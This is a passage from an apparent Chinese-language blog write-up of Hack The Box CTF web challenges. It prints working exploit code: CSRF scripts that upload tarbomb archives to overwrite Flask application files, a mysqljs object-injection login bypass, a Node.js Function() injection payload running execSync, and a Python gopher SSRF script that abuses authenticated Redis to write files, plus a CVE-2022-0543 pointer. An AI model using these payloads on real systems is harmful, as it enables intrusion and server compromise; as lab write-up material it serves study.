class="string">&quot;H4sICMFwg2IC/3JvdXRlcy50YXIA7VdfbxtFEPezP8VWeThbOp2dNI2lSpYiJEB9QCAKT1F1WvvWztL7Y3b3YkyFlEqVoEFQkCjiTyQaRBEPiJSXtjQBvkzshG/B7O7t2Xc+JxFErUA3UuK73bnfzOzMb3fWcRqO08CDgfzzaRcLGoWNjh+TAaOh4A0WxYJwZzCq/GNpgrRaLfULkv9tXVltVZZXV1aba63m8tpKpbnSXLt8pYKalecgMReYIVRhUSRO0ztrPh/cf0RoMIiYQO/wKKz2WBSgmTJwPCxwB3OCEq23OWE2eoWyYIgZsdGbRA7byOvYKKB9hgVxvc48TiyobzAod7EX0NBG5D3BcFe4vQRPf9fzMb9plF8ydWgrD2lvZCNGPMpIV8in0CPMFSQY+GBaDrwbEy5mgFw/6tPQwHVjBt8IN1ZxqClXfgN4nnlP56Du1ct8OJ1IGMQtyqkADPlSrQ5JB7WnTtcsGLBs5LohDojr1qt4QLMKMJBRqHqkB2HwQRRyUgsI57hP6lerCIQREbPQLETtlpVMW1dR8vQBAKyDTUeRtmY1ADsgYjPyeHvDevXlt6wbdWVBhVrL4uZWs2YpJWdTBL6Vxx01w/4ibDk3B50EZG3i7k2FBoGnaMpQBu6N16+neDIHbsZh2kMhpCDJtgMVJddEzxVafY1yTsM+MrlGA8xgwQVh/JJVt9Fqc7mqvpYFDwkyyH0iFHStjnKypNIweXA4Prx3/M2d468Pxr/fn9x/NPnkFwUknZY5BTCJKZFqlhmEUC0LIJXmAHM+jJiX0TSDWrM6G3WKHDH1blQvInyJDX5ImjuwAmzk9KgPam5nVDN22+ahDpOMC7k2S2jy3cOT/e/R8Rc/TT56Agty9Ofe5Pb+nOPGafnsTCNvnyeKa+EW9qmXWQDzWRLGZW1wSmTltXJQZ0j7V1yaMmqEY7EJO4RkOqwTj7tdYFYv9v3RpTkSMNKnHFZnERHM/Fk8M3pTqs2So9DKHD+0FlP70wukyXlr/39S+al7cuYUN3Rp+YxgbwTHHmQqZz4kQ3fGhXmTdhpt2zzUJe2eHIx3Hky+fDRT2F7H4VC08qDCnlcz0PX8ZDcKApoGUeyzKb4zueBhvtmJMOStXl3PHqyqSNP5s8iQKhazwfQKDR/8KiAerIlpT9D422dHB48L3TEwroQxLmUGIRMGKCkI7PtJgecO4g0WDR0RuR7tyt2wB+UJIwjajgyicm7y1R/HPzyb3N2e7N5dFJruJgr5XhSLVneh0mPyoqkfRF7sE5dmOZ2OzpBfuZvRUiMFtJ9iJrxXihcRi6SGXj1wRPeytdRaO32ytcW2+m8n60082Brasw2lk24PkGetNN7/7eTXveM7j8effaqpuoihWv8Mjs42m8mxu39vsvNw/PnO0dPtyc97CDpTOImPdz/W7zonaWO+kOvXVDJMYAVUL6zTeOBH2DtXna6brh+dX5aQ+uKv3e2TH29nWRsPPLlZTIvdgt2aWLo6wrQ45SC/iEJJbiqQESiU/LWlljG3oV25odJz9HTn6BC25w/lPpS4OsU6xbN0D9ORQlBUUOh+3s9lx7EWpfR6JLMioxtCgaIhi8I+HCI+kdc5wUYI9zENp31TrrPZomRY1Nf8y8Qu5VOqLaU1rZdEU5GnpJzdgFHSbUKN610Ums3k+nV6jyXt6DPFUJi3E0P5w0xf/hacZHrSuDpzT8weDuaWKi9hgF8ppZRSSimllFJKKaWUUkoppZRSSimllFJKKaWU5yl/A8Vb63YAKAAA&quot;</span>).replace(<span class="regexp">/%/g</span>, <span class="string">&#x27;%25&#x27;</span>))+</span><br><span class="line">          <span class="string">&quot;\r\n&quot;</span> +</span><br><span class="line">          <span class="string">&quot;------WebKitFormBoundarypXheHIDWfea2zg7D--\r\n&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> aBody = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(body.length);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; aBody.length; i++)</span><br><span class="line">          aBody[i] = body.charCodeAt(i);</span><br><span class="line">        xhr.send(<span class="keyword">new</span> Blob([aBody]));</span><br><span class="line">      &#125;</span><br><span class="line">	  submitRequest();</span><br><span class="line">	&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>本地完全没问题，但是题目环境不行，起个docker试试，顺带记录一下起docker换源的经历</p>
<p>先 sh build-docker.sh，然后会生成一个docker image，参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_37551036/article/details/114482730">https://blog.csdn.net/weixin_37551036/article/details/114482730</a> 进入docker，然后换源，在Dockerfile添加，速度起飞</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">RUN sed -i &#39;s&#x2F;dl-cdn.alpinelinux.org&#x2F;mirrors.ustc.edu.cn&#x2F;g&#39; &#x2F;etc&#x2F;apk&#x2F;repositories</span><br></pre></td></tr></table></figure>

<p>上TMD大当了，卧槽，发现没有这个路由，少了个 api/ </p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220517004550340.png" alt="image-20220517004550340"></p>
<p>填入payload</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220517095325660.png" alt="image-20220517095325660"></p>
<p>成功</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220517095413034.png" alt="image-20220517095413034"></p>
<p>但是发现它不能立即渲染html，很是难受，现在想法是让tarbomb来crash掉flask应用，等到重启时，便达到目的</p>
<p>run.py</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python2 eval.py run.py -p app&#x2F; -d 2 -o unix -f run.tar.gz</span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> application.main <span class="keyword">import</span> app</span><br><span class="line"><span class="keyword">from</span> application.database <span class="keyword">import</span> migrate_db</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> app.app_context():</span><br><span class="line">    migrate_db()</span><br><span class="line"></span><br><span class="line">app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">1337</span>, debug=<span class="literal">True</span>, use_evalex=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>



<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">      <span class="function"><span class="keyword">function</span> <span class="title">submitRequest</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">        xhr.open(<span class="string">&quot;POST&quot;</span>, <span class="string">&quot;http://localhost:1337/api/firmware/upload&quot;</span>);</span><br><span class="line">        xhr.setRequestHeader(<span class="string">&quot;Accept&quot;</span>, <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;</span>);</span><br><span class="line">        xhr.setRequestHeader(<span class="string">&quot;Accept-Language&quot;</span>, <span class="string">&quot;de-de,de;q=0.8,en-us;q=0.5,en;q=0.3&quot;</span>);</span><br><span class="line">        xhr.setRequestHeader(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;multipart/form-data; boundary=----WebKitFormBoundarypXheHIDWfea2zg7D&quot;</span>);</span><br><span class="line">        xhr.withCredentials = <span class="string">&quot;true&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> body = </span><br><span class="line">          <span class="string">&quot;------WebKitFormBoundarypXheHIDWfea2zg7D\r\n&quot;</span> +</span><br><span class="line">          <span class="string">&quot;Content-Disposition: form-data; name=\&quot;file\&quot;; filename=\&quot;run.tar.gz\&quot;\r\n&quot;</span> +</span><br><span class="line">          <span class="string">&quot;Content-Type: application/x-gzip\r\n&quot;</span> +</span><br><span class="line">          <span class="string">&quot;\r\n&quot;</span> +<span class="built_in">decodeURIComponent</span>(atob(<span class="string">&quot;H4sICNGNg2IC/3J1bi50YXIA7dLRasMgFAZgr30K75pAMKYJFQZ5i90H07hWaGIwx619+5rAGHSwXW0w9n8iB44/B0SlLKUszTyXIU5yvrEfoBKt9VaTx6r2WrGq2TdKq4OuUq6qm+rAhGK/IC5kghAseE9f5b47f7zcH/ES/CjS81/c0ZDzkxyNm4QbZx9o7fNPgcGQ6c1i30OjOwVDtht6zt8cndewTLs7+onslbL8iYvkI5flnK+h9OOys1+o3Sm5rV0h1pFtVde6EIPt46l9DtEWIi62s6/mYq9bI+cMAAAAAAAAAAAAAAAAAAAAAADgn7sDYnNphwAoAAA=&quot;</span>).replace(<span class="regexp">/%/g</span>, <span class="string">&#x27;%25&#x27;</span>))+</span><br><span class="line">          <span class="string">&quot;\r\n&quot;</span> +</span><br><span class="line">          <span class="string">&quot;------WebKitFormBoundarypXheHIDWfea2zg7D--\r\n&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> aBody = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(body.length);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; aBody.length; i++)</span><br><span class="line">          aBody[i] = body.charCodeAt(i);</span><br><span class="line">        xhr.send(<span class="keyword">new</span> Blob([aBody]));</span><br><span class="line">      &#125;</span><br><span class="line">	  submitRequest();</span><br><span class="line">	&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>routes.py</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python2 eval.py routes.py -p app&#x2F;application&#x2F;blueprints -d 2 -o unix -f routes.tar.gz</span><br></pre></td></tr></table></figure>



<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">      <span class="function"><span class="keyword">function</span> <span class="title">submitRequest</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">        xhr.open(<span class="string">&quot;POST&quot;</span>, <span class="string">&quot;http://localhost:1337/api/firmware/upload&quot;</span>);</span><br><span class="line">        xhr.setRequestHeader(<span class="string">&quot;Accept&quot;</span>, <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;</span>);</span><br><span class="line">        xhr.setRequestHeader(<span class="string">&quot;Accept-Language&quot;</span>, <span class="string">&quot;de-de,de;q=0.8,en-us;q=0.5,en;q=0.3&quot;</span>);</span><br><span class="line">        xhr.setRequestHeader(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;multipart/form-data; boundary=----WebKitFormBoundarypXheHIDWfea2zg7D&quot;</span>);</span><br><span class="line">        xhr.withCredentials = <span class="string">&quot;true&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> body = </span><br><span class="line">          <span class="string">&quot;------WebKitFormBoundarypXheHIDWfea2zg7D\r\n&quot;</span> +</span><br><span class="line">          <span class="string">&quot;Content-Disposition: form-data; name=\&quot;file\&quot;; filename=\&quot;routes.tar.gz\&quot;\r\n&quot;</span> +</span><br><span class="line">          <span class="string">&quot;Content-Type: application/x-gzip\r\n&quot;</span> +</span><br><span class="line">          <span class="string">&quot;\r\n&quot;</span> +<span class="built_in">decodeURIComponent</span>(atob(<span class="string">&quot;H4sICLGFg2IC/3JvdXRlcy50YXIA7Vffi+M2EM5z/grdkxwwTnZv2YUDw1LoHfdQWnq9p2UxcqQk6tmWK8mbpqX/+40ky7EdZ7Mcy5UDfbAbWzOaH5pvJDlJlkmyJHVt/gq+JpqLapkXDaslr7RaStFoppL6MPtmrAB3d3f2FzD+vVtdX8+ubq5vzNPt26vZ6np1e3U7Q6vZd0CjNJEIzaQQ+jm9S/Jxcj8IeFkLqdGfSlTzjRQl6tEgoUSTnCiGWq3PiskYveey3BPJYvQ7M8MxonmMSr6VRLOM5qd2Gs0Lb4OrjNCSVzFif2tJ1jrbtPbcvE1B1Bev/JPnYWwj5JtDjCSjXLK1Nk8VZTLTrKwLcG0G/mqY0j1DWSG2vPLm1o2EOTprbB5WlJk5YI/6904GvLcvp+nkQnuLT1xxDTbMy3y+ZzlKj0FHGAZwjLKsIiXLssWc1HyoAAMDhTllG0hD1aJSLCqZUmTLFu/mCCCZbmTlFyL6F7di/A61T/+BgXvwmdimjfASbJdM7wRV6QP+8PMf+HFhPdhUo6Hd0WpG2ColO10WeGxX7VhR4HjStpWd2G4zwjuy/pIfDqtqa41C/p1R628Q8W+/furMmlJkg7j5BlVQibboCRDLLI2TTfr+hSvFqy3yJUc1kbDumkn1Bi9idLO6mtvZhvdQJ295y7Q1HS2s1ERi6gUaRtGII+wHIX6MnV5NlNoLSQd6frDV6yfS2RXSvnvV18jI2IY4TAMnkJQ8JBtegFqWHyLvN/UPCxBKpaPT8Hxo5jk55pe+JNaP1RMpOB2k6ae1wb51Do+NaGNbTDPJ5IJIo3fQ0aYzIXvVrNfQCZumKA5vTkgr2ZYryPlcU3j5pb7wesfW6LN40ssJkZ2WtPtJ4PN357ORPBOGo1YhGaEHOKagUiP3FdtnvRBOXcZdtql/cItI80QBRc0xQiiNvKET4VqUJe9Cno7QU+0i8ylRu1wQqNJifj889iwlO/kl6neK09z3J/mygLim2mzKuZ+UmUk+gMEgrLK/c7TFJuaEmToUH6TYJ1pklK/BFtoA9WAEwRVgYPHxbOTuKJ9s3qngnXoGtG3Y/93HpaBNwTI+bNButNfJNtyBlh2Z6OGjzbaJreJr5GKY71YPAnEXyajzlnZPsfOY2v9xu96MQp+n/dtc0vX6uS5zMy/0Wf8651e1u9eebcaPdjl9aBO9OMm0pi4EoS9i2r2/NA8bpqmp6coj7TBsggy7OlUdTcygeo2StRd2WDYo2fj2Hg3cPbhQHhc+tOPcZyLxXY5cZpAE1xwuDf+MVjXB50rxSZjVNNnsgRpoL0W1hb24YOYrRssDIlvCq+N1Y3RBeOJs/5J9a1gQN6+jjUvQUVp15D63c01cL4w1t8F6wqu0NTfe2d13yplt3Ql9QL1PmnEE7oPKfC+A/VlAQEBAQEBAQEBAQEBAQEBAQEBAQEBAwA+Or6sUNcQAKAAA&quot;</span>).replace(<span class="regexp">/%/g</span>, <span class="string">&#x27;%25&#x27;</span>))+</span><br><span class="line">          <span class="string">&quot;\r\n&quot;</span> +</span><br><span class="line">          <span class="string">&quot;------WebKitFormBoundarypXheHIDWfea2zg7D--\r\n&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> aBody = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(body.length);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; aBody.length; i++)</span><br><span class="line">          aBody[i] = body.charCodeAt(i);</span><br><span class="line">        xhr.send(<span class="keyword">new</span> Blob([aBody]));</span><br><span class="line">      &#125;</span><br><span class="line">	  submitRequest();</span><br><span class="line">	&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>TMD，REtard师傅，我的超人！一句话点破我，现在存在任意文件写，不访问 register.html，绕过模板缓存，直接POST注册用户，然后写文件，再去房访问 register.html 成功SSTI！</p>
<p>注册用户：</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220518110753948.png" alt="image-20220518110753948"></p>
<p>构造恶意zip：</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220518110611626.png" alt="image-20220518110611626"></p>
<p>CSRF：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">      <span class="function"><span class="keyword">function</span> <span class="title">submitRequest</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">        xhr.open(<span class="string">&quot;POST&quot;</span>, <span class="string">&quot;http://localhost:1337/api/firmware/upload&quot;</span>);</span><br><span class="line">        xhr.setRequestHeader(<span class="string">&quot;Accept&quot;</span>, <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;</span>);</span><br><span class="line">        xhr.setRequestHeader(<span class="string">&quot;Accept-Language&quot;</span>, <span class="string">&quot;de-de,de;q=0.8,en-us;q=0.5,en;q=0.3&quot;</span>);</span><br><span class="line">        xhr.setRequestHeader(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;multipart/form-data; boundary=----WebKitFormBoundarypXheHIDWfea2zg7D&quot;</span>);</span><br><span class="line">        xhr.withCredentials = <span class="string">&quot;true&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> body = </span><br><span class="line">          <span class="string">&quot;------WebKitFormBoundarypXheHIDWfea2zg7D\r\n&quot;</span> +</span><br><span class="line">          <span class="string">&quot;Content-Disposition: form-data; name=\&quot;file\&quot;; filename=\&quot;register.tar.gz\&quot;\r\n&quot;</span> +</span><br><span class="line">          <span class="string">&quot;Content-Type: application/x-gzip\r\n&quot;</span> +</span><br><span class="line">          <span class="string">&quot;\r\n&quot;</span> +<span class="built_in">decodeURIComponent</span>(atob(<span class="string">&quot;H4sICIRihGIC/3JlZ2lzdGVyLnRhcgDt0s1qAyEQB3DPeQpvm1xG3Xzsre9RSlnM1mwEo6JTKIS8e+0eU2ihlELh/wOZYZzLDEOkiJTN+eMFP1n2KSp2lxwsu6qKm31lV+jMlyB+RjfDMCyxuY/aHIwwu35n9MGY7V7o3vTbQUgt/sBrZVukFCUl/qrvu//74f6J63VK8eRnGscp2FrHsWU+el6SOaSjDa341KXaPVNO2cV1165EqlOwM/Ebywf56X7aTtlP6lHHpaXbUHH2Zb253VYCAAAAAAAAAAAAAAAAAAAAAAAAfsM7tQhSNgAoAAA=&quot;</span>).replace(<span class="regexp">/%/g</span>, <span class="string">&#x27;%25&#x27;</span>))+</span><br><span class="line">          <span class="string">&quot;\r\n&quot;</span> +</span><br><span class="line">          <span class="string">&quot;------WebKitFormBoundarypXheHIDWfea2zg7D--\r\n&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> aBody = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(body.length);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; aBody.length; i++)</span><br><span class="line">          aBody[i] = body.charCodeAt(i);</span><br><span class="line">        xhr.send(<span class="keyword">new</span> Blob([aBody]));</span><br><span class="line">      &#125;</span><br><span class="line">	  submitRequest();</span><br><span class="line">	&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>访问 /register：空白，成功了</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220518111443527.png" alt="image-20220518111443527"></p>
<p>再访问 url/static/Y0ng.txt</p>
<p>FLAG：HTB{des3r1aliz3_4ll_th3_th1ngs}</p>
<p>看这flag，这种解法是非预期了？</p>
<h1 id="Spiky-Tamagotchy"><a href="#Spiky-Tamagotchy" class="headerlink" title="Spiky Tamagotchy"></a>Spiky Tamagotchy</h1><p>可以看到/interface路由下的函数功能直接拼接到 Function()中，明显可以rce，开始debug</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220517202041248.png" alt="image-20220517202041248"></p>
<p>但是前面有个登录页面，不知道任何的用户信息，而且没有注册功能</p>
<p>登录处理：使用了占位符防止注入</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220517231405348.png" alt="image-20220517231405348"></p>
<p>另外有 JWT 的检查</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220517231451361.png" alt="image-20220517231451361"></p>
<p>这两个东西让我不知道怎么绕过他们，这道题我尝试了一下午，最终找到一篇绕过文章写的非常详细：<a target="_blank" rel="noopener" href="https://flattsecurity.medium.com/finding-an-unseen-sql-injection-by-bypassing-escape-functions-in-mysqljs-mysql-90b27f6542b4">https://flattsecurity.medium.com/finding-an-unseen-sql-injection-by-bypassing-escape-functions-in-mysqljs-mysql-90b27f6542b4</a></p>
<p>利用nodejs中类型的处理进行绕过，payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&#123;&quot;password&quot;:1&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>会导致最终查询的语句变为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;SELECT username FROM user WHERE username &#x3D; &#39;admin&#39; AND password &#x3D; &#96;password&#96; &#x3D; 1&#39;</span><br></pre></td></tr></table></figure>

<p>针对不同类型进行不同的转移处理，这里处理Object，看到返回的sql</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220518085101326.png" alt="image-20220518085101326"></p>
<p>最后拼接sql语句</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220518085215514.png" alt="image-20220518085215514"></p>
<p>登录成功</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220518084946419.png" alt="image-20220518084946419"></p>
<p>构造 payload，类似命令注入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;activity&quot;:&quot;123&#39;)&#123;if(a&#x3D;&#39;123&#39;)&#123;a&#x3D;&#39;234&#39;&#125; return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;cat &#x2F;flag.txt &gt; &#x2F;app&#x2F;static&#x2F;test.txt&#39;)&#125;;with(a&#x3D;&#39;1&quot;,&quot;health&quot;:&quot;50&quot;,&quot;weight&quot;:&quot;42&quot;,&quot;happiness&quot;:&quot;50&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>FLAG：HTB{3sc4p3d_bec0z_n0_typ3_ch3ck5}</p>
<h1 id="Red-Island"><a href="#Red-Island" class="headerlink" title="Red Island"></a>Red Island</h1><ul>
<li>认证redis</li>
<li>CVE-2022-0543</li>
</ul>
<p>/app/index.js 这里存在redis的认证密码</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">&quot;express-session&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> RedisStore = <span class="built_in">require</span>(<span class="string">&quot;connect-redis&quot;</span>)(session);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&quot;path&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> cookieParser = <span class="built_in">require</span>(<span class="string">&quot;cookie-parser&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> nunjucks = <span class="built_in">require</span>(<span class="string">&quot;nunjucks&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> routes = <span class="built_in">require</span>(<span class="string">&quot;./routes&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> Database = <span class="built_in">require</span>(<span class="string">&quot;./database&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; createClient &#125; = <span class="built_in">require</span>(<span class="string">&quot;redis&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> redisClient = createClient(&#123; <span class="attr">legacyMode</span>: <span class="literal">true</span> &#125;);</span><br><span class="line"><span class="keyword">const</span> db = <span class="keyword">new</span> Database(<span class="string">&quot;redisland.db&quot;</span>);</span><br><span class="line">app.use(express.json());</span><br><span class="line">app.use(cookieParser());</span><br><span class="line">redisClient.connect().catch(<span class="built_in">console</span>.error);</span><br><span class="line">app.use(</span><br><span class="line">  session(&#123;</span><br><span class="line">    store: <span class="keyword">new</span> RedisStore(&#123; <span class="attr">client</span>: redisClient &#125;),</span><br><span class="line">    saveUninitialized: <span class="literal">false</span>,</span><br><span class="line">    secret: <span class="string">&quot;r4yh4nb34t5B1gM4c&quot;</span>,</span><br><span class="line">    resave: <span class="literal">false</span>,</span><br><span class="line">  &#125;)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">nunjucks.configure(<span class="string">&quot;views&quot;</span>, &#123; <span class="attr">autoescape</span>: <span class="literal">true</span>, <span class="attr">express</span>: app &#125;);</span><br><span class="line"></span><br><span class="line">app.set(<span class="string">&quot;views&quot;</span>, <span class="string">&quot;./views&quot;</span>);</span><br><span class="line"></span><br><span class="line">app.use(<span class="string">&quot;/static&quot;</span>, express.static(path.resolve(<span class="string">&quot;static&quot;</span>)));</span><br><span class="line"></span><br><span class="line">app.use(routes(db));</span><br><span class="line"></span><br><span class="line">app.all(<span class="string">&quot;*&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> res.status(<span class="number">404</span>).send(&#123; <span class="attr">message</span>: <span class="string">&quot;404 page not found&quot;</span> &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">(<span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">  <span class="keyword">await</span> db.connect();</span><br><span class="line">  <span class="keyword">await</span> db.migrate();</span><br><span class="line">  app.listen(<span class="number">1337</span>, <span class="string">&quot;0.0.0.0&quot;</span>, <span class="function">() =&gt;</span> <span class="built_in">console</span>.log(<span class="string">&quot;Listening on port 1337&quot;</span>));</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>

<p>看到 /app/routers/index.js 提供图片下载功能</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220518114745346.png" alt="image-20220518114745346"></p>
<p>看下 /app/helpers/ImageDownloader.js，其中使用了 node-libcurl 这个库，翻看文档支持协议有</p>
<blockquote>
<p>支持 DICT、FILE、FTP、FTPS、Gopher、HTTP、HTTPS、IMAP、IMAPS、LDAP、LDAPS、POP3、POP3S、RTMP、RTSP、SCP、 SFTP、SMTP、SMTPS、Telnet 和 TFTP</p>
</blockquote>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220518114814858.png" alt="image-20220518114814858"></p>
<p>然后按照之前题目的文件构造读了一下其他文件，没啥用，总结下来就是打认证redis</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line">protocol = <span class="string">&quot;gopher://&quot;</span></span><br><span class="line">ip = <span class="string">&quot;localhost&quot;</span></span><br><span class="line">port = <span class="string">&quot;6379&quot;</span></span><br><span class="line">shell = <span class="string">&quot;\n\ntest\n\n&quot;</span></span><br><span class="line">filename = <span class="string">&quot;test.txt&quot;</span></span><br><span class="line">path = <span class="string">&quot;/app/static&quot;</span></span><br><span class="line">passwd = <span class="string">&quot;&quot;</span></span><br><span class="line">cmd = [<span class="string">&quot;auth r4yh4nb34t5B1gM4c&quot;</span>,</span><br><span class="line">	<span class="string">&quot;flushall&quot;</span>,</span><br><span class="line">	<span class="string">&quot;set 1 &#123;&#125;&quot;</span>.<span class="built_in">format</span>(shell.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;$&#123;IFS&#125;&quot;</span>)),</span><br><span class="line">	<span class="string">&quot;config set dir &#123;&#125;&quot;</span>.<span class="built_in">format</span>(path),</span><br><span class="line">	<span class="string">&quot;config set dbfilename &#123;&#125;&quot;</span>.<span class="built_in">format</span>(filename),</span><br><span class="line">	<span class="string">&quot;save&quot;</span>,</span><br><span class="line">	<span class="string">&quot;quit&quot;</span></span><br><span class="line">	]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">	cmd.insert(<span class="number">0</span>,<span class="string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="built_in">format</span>(passwd))</span><br><span class="line">payload = protocol + ip + <span class="string">&quot;:&quot;</span> + port + <span class="string">&quot;/_&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_format</span>(<span class="params">arr</span>):</span></span><br><span class="line">	CRLF = <span class="string">&quot;\r\n&quot;</span></span><br><span class="line">	redis_arr = arr.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">	cmd = <span class="string">&quot;&quot;</span></span><br><span class="line">	cmd += <span class="string">&quot;*&quot;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>(redis_arr))</span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">		cmd += CRLF + <span class="string">&quot;$&quot;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>((x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>))))+CRLF+x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>)</span><br><span class="line">	cmd += CRLF</span><br><span class="line">	<span class="keyword">return</span> cmd</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">		payload += urllib.parse.quote(redis_format(x))</span><br><span class="line">	print(payload)</span><br><span class="line">	<span class="comment">#print(urllib.parse.quote(payload))  urlencode</span></span><br></pre></td></tr></table></figure>



<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220518133746593.png" alt="image-20220518133746593"></p>
<p>访问之后，确实可以写文件</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220518133827324.png" alt="image-20220518133827324"></p>
<p>发现是redis5.0.7，那就是 CVE-2022-0543 喽，<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/redis/CVE-2022-0543/README.zh-cn.md">vulhub/README.zh-cn.md at master · vulhub/vulhub (github.com)</a></p>
<p>更换exp：</p>
